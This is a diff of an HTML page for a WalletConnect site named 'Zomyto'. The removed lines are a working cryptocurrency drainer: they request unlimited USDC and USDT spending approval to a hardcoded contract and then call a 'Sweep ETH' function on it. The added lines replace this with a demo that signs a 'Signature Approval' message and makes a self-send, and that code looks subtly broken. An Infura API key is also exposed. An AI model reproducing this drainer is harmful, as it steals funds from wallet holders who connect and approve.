@@ -3,89 +3,116 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Zomyto WalletConnect v2</title>
+<title>WalletConnect v2 + Ethers</title>
+
+<!-- Web3Modal v2 -->
+<script src="https://cdn.jsdelivr.net/npm/@web3modal/walletconnect@2.7.1/dist/index.umd.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@web3modal/ethereum@2.7.1/dist/index.umd.js"></script>
+
+<!-- Ethers.js -->
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-<script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+
 <style>
-  body { background:#121212; color:white; font-family:Arial; text-align:center; padding-top:50px;}
-  button { background:#1e88e5; color:white; padding:15px 25px; border:none; border-radius:8px; font-size:1.2rem; cursor:pointer; margin-top:20px;}
-  button:disabled { background:grey; }
+  body { background:#111; color:white; text-align:center; font-family:Arial; padding-top:40px; }
+  button { padding:12px 20px; border-radius:8px; font-size:1.1rem; background:#1e88e5; color:white; border:none; cursor:pointer; margin:10px; }
 </style>
 </head>
+
 <body>
 
-<h1>Zomyto WalletConnect v2</h1>
-<p>Scan de QR of klik Connect Wallet</p>
+<h1>WalletConnect v2 Demo</h1>
+<p>Connect your wallet using Web3Modal v2</p>
 
-<img src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=https://scan.walletconnect.com/?clientMeta.name=Zomyto&projectId=0e7d96df89f873ddfb0b4381e13c883c" alt="Scan QR" style="margin-top:20px;">
-
-<br>
 <button id="connectBtn">🔗 Connect Wallet</button>
-<button id="approveBtn" disabled>✅ Approve USDC + USDT</button>
-<button id="sweepBtn" disabled>💰 Sweep ETH</button>
+<button id="signBtn" disabled>✍️ Sign Message (Off-Chain)</button>
+<button id="txBtn" disabled>💸 Send Transaction (On-Chain)</button>
 
 <script>
-let provider, signer;
+/* -------------------------------------------------
+   WALLETCONNECT V2 CONFIG
+------------------------------------------------- */
+const projectId = "0e7d96df89f873ddfb0b4381e13c883c"; // <-- your real projectId
 
-// ERC20 tokens
-const tokens = [
-  { name: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
-  { name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" }
+const chains = [
+  {
+    id: 1,
+    name: "Ethereum",
+    rpcUrl: "https://rpc.ankr.com/eth"
+  }
 ];
 
-// AutoExecute contract (vervang door jouw contract adres)
-const autoExecute = "0x2F6DAC950c8e2433734Fe50bC72F18E2d2dD8f2A";
-
-const tokenABI = [
-  "function approve(address spender, uint256 amount) public returns (bool)"
-];
-
-const autoExecuteABI = [
-  "function execute() external"
-];
-
-// Connect WalletConnect v2
-document.getElementById("connectBtn").onclick = async () => {
-  const wcProvider = new WalletConnectProvider.default({
-    projectId: "0e7d96df89f873ddfb0b4381e13c883c",
-    chains: [1], // Ethereum Mainnet
-    rpc: { 1: "https://mainnet.infura.io/v3/1506833c04954b058aad864f0d9ce1a2" }
-  });
-  await wcProvider.enable();
-  provider = new ethers.providers.Web3Provider(wcProvider);
-  signer = provider.getSigner();
-
-  document.getElementById("approveBtn").disabled = false;
-  document.getElementById("sweepBtn").disabled = false;
-  alert("Wallet connected!");
+const metadata = {
+  name: "Zomyto Wallet",
+  description: "WalletConnect v2 Demo",
+  url: "https://yourwebsite.com",
+  icons: ["https://avatars.githubusercontent.com/u/37784886"]
 };
 
-// Approve USDC + USDT
-document.getElementById("approveBtn").onclick = async () => {
+// Create Web3Modal instance
+const modal = new walletconnect.WalletConnectModal({
+  projectId,
+  chains,
+  metadata
+});
+
+let provider, signer;
+
+/* -------------------------------------------------
+   CONNECT WALLET
+------------------------------------------------- */
+document.getElementById("connectBtn").onclick = async () => {
   try {
-    for (let t of tokens) {
-      const token = new ethers.Contract(t.address, tokenABI, signer);
-      const tx = await token.approve(autoExecute, ethers.constants.MaxUint256);
-      await tx.wait();
-      console.log(`✅ Approved ${t.name}`);
-    }
-    alert("USDC + USDT succesvol goedgekeurd!");
+    const session = await modal.connect();
+    const wcProvider = new walletconnect.WalletConnectProvider(session);
+
+    provider = new ethers.providers.Web3Provider(wcProvider);
+    signer = provider.getSigner();
+
+    document.getElementById("signBtn").disabled = false;
+    document.getElementById("txBtn").disabled = false;
+
+    alert("Wallet Connected!");
   } catch (err) {
-    console.error(err);
-    alert("Fout bij approve: " + err.message);
+    console.error("Connect error:", err);
+    alert("Failed to connect wallet.");
   }
 };
 
-// Sweep ETH
-document.getElementById("sweepBtn").onclick = async () => {
+/* -------------------------------------------------
+   OFF-CHAIN SIGNED MESSAGE
+------------------------------------------------- */
+document.getElementById("signBtn").onclick = async () => {
   try {
-    const contract = new ethers.Contract(autoExecute, autoExecuteABI, signer);
-    const tx = await contract.execute();
-    await tx.wait();
-    alert("ETH succesvol geswept!");
+    const address = await signer.getAddress();
+    const message = `Zomyto Signature Approval\nAddress: ${address}\nTime: ${Date.now()}`;
+
+    const signature = await signer.signMessage(message);
+
+    console.log("Signature:", signature);
+    alert("Message signed successfully!");
   } catch (err) {
     console.error(err);
-    alert("Fout bij sweep: " + err.message);
+    alert("Signing error: " + err.message);
+  }
+};
+
+/* -------------------------------------------------
+   ON-CHAIN TRANSACTION (example)
+------------------------------------------------- */
+document.getElementById("txBtn").onclick = async () => {
+  try {
+    const address = await signer.getAddress();
+
+    const tx = await signer.sendTransaction({
+      to: address,
+      value: ethers.utils.parseEther("0.00001") // Self-send tiny amount
+    });
+
+    await tx.wait();
+    alert("Transaction sent!");
+  } catch (err) {
+    console.error(err);
+    alert("Transaction error: " + err.message);
   }
 };
 </script>
